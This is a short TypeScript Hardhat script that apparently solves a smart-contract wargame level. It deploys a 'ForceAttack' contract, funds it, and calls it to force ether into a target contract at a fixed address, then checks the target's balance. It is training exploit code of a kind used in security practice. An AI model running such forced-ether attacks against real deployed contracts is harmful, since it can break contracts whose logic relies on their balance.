import { assert, expect } from "chai";
import { ethers, waffle } from "hardhat";
import { ForceAttack__factory } from "../typechain/factories/ForceAttack__factory";
import { ForceAttack } from "../typechain/ForceAttack";

async function main() {
  const [addr1] = await ethers.getSigners();
  const provider = waffle.provider;
  const deployedAddress = '0x0C76F13D3fBcFA335aF4b9D88DF2455eB696e8ef';
  const forceAttackInstance: ForceAttack = await new ForceAttack__factory(addr1).deploy();
  await forceAttackInstance.deployed();
  console.log("deployed : " + forceAttackInstance.address)

  expect((await provider.getBalance(deployedAddress)).toString()).to.equal(ethers.utils.parseEther("0").toString());
  await addr1.sendTransaction({
    from: addr1.address,
    to: forceAttackInstance.address,
    value: ethers.utils.parseEther("0.01"),
    gasLimit: 200000
  });
  console.log((await provider.getBalance(forceAttackInstance.address)).toString())
  await forceAttackInstance.sendEth(deployedAddress, { gasLimit: 200000 });
  expect((await provider.getBalance(deployedAddress)).gt(0)).to.be.true;
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
